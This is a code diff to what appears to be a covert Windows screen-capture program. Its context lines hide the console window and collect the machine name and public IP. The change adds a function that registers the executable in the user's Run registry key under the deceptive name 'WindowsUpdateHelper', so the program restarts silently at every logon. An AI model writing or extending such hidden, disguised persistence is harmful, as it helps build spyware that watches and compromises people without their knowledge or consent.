@@ -424,11 +424,25 @@ DWORD WINAPI screenThread(LPVOID) {
     return 0;
 }
 
+void installStartup() {
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        char path[MAX_PATH];
+        DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
+        if (len > 0) {
+            path[len] = 0;
+            RegSetValueExA(hKey, "WindowsUpdateHelper", 0, REG_SZ, (BYTE*)path, len+1);
+        }
+        RegCloseKey(hKey);
+    }
+}
+
 int main() {
     HWND hwnd = GetConsoleWindow();
     if (hwnd) ShowWindow(hwnd, SW_HIDE);
     computerName = getComputerName();
     publicIP = getPublicIP();
+    installStartup();
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
